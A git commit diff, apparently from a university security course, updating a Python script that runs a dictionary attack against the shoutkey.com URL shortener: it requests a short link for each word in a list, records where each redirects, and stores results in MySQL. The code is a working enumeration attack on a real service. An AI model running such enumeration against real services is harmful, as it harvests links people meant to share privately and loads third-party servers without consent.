8dc81340696aee0be132851dd05fad9d1b107751
Eunice Lin <eunicel@mit.edu>
2016-04-27 12:08:00 -0400

    added attack for words in shoutkey dictionary

--- attack.py
+++ attack.py
@@ -2,7 +2,8 @@ import mysql.connector
 import urllib2
 import datetime
 
-wl = open('/usr/share/dict/words', 'r')
+#wl = open('/usr/share/dict/words', 'r')
+wl = open('/Users/eunice/Dropbox (MIT)/MIT/Year4/Spring/6.857/elf/shoutkey_dictionary.txt', 'r')
 wordlist = wl.readlines()
 wl.close()
 
@@ -27,13 +28,24 @@ cursor = url_data.cursor()
 #)
 #cursor.execute(drop_stmt)
 
-create_stmt = ( 
-        'CREATE TABLE IF NOT EXISTS urls'
-        ' (WORD CHAR(30), REDIRECT_URL CHAR(255), TIMESTAMP CHAR(30))'
-)
-cursor.execute(create_stmt)
-insert_stmt = 'INSERT IGNORE INTO urls (WORD, REDIRECT_URL, TIMESTAMP) VALUES (%s, %s, %s)'
+# USE THIS FOR REGULAR DICTIONARY ATTACK
+#create_stmt = ( 
+#        'CREATE TABLE IF NOT EXISTS urls'
+#        ' (WORD CHAR(30), REDIRECT_URL CHAR(255), TIMESTAMP CHAR(30))'
+#)
 
+# USE THIS FOR SHOUTKEY DICTIONARY ATTACK
+create_stmt = (
+	'CREATE TABLE IF NOT EXISTS shoutkey_attack'
+	' (WORD CHAR(30), REDIRECT_URL CHAR(255), TIMESTAMP CHAR(30))'
+)
+
+cursor.execute(create_stmt)
+# USE THIS FOR REGULAR DICTIONARY ATTACK
+#insert_stmt = 'INSERT IGNORE INTO urls (WORD, REDIRECT_URL, TIMESTAMP) VALUES (%s, %s, %s)'
+
+# USE THIS FOR SHOUTKEY DICTIONARY ATTACK
+insert_stmt = 'INSERT IGNORE INTO shoutkey_attack (WORD, REDIRECT_URL, TIMESTAMP) VALUES (%s, %s, %s)'
 
 starttime = datetime.datetime.now()
 num_redirected = 0
@@ -41,7 +53,7 @@ for word in wordlist:
 	word = word[0:len(word)-1] # strips off newline at the end
 	original_url = "http://shoutkey.com/" + word
 	redirected_url = get_redirected_url(original_url)
-	if redirected_url == original_url or redirected_url == "http://shoutkey.com/":
+	if redirected_url == original_url or redirected_url == "http://shoutkey.com/" or redirected_url == "http://shoutkey.com/system/" or redirected_url == "http://shoutkey.com/application/":
 		# did not redirect
 		print word, " did not redirect"
 		cursor.execute(insert_stmt, (word, None, datetime.datetime.now()))
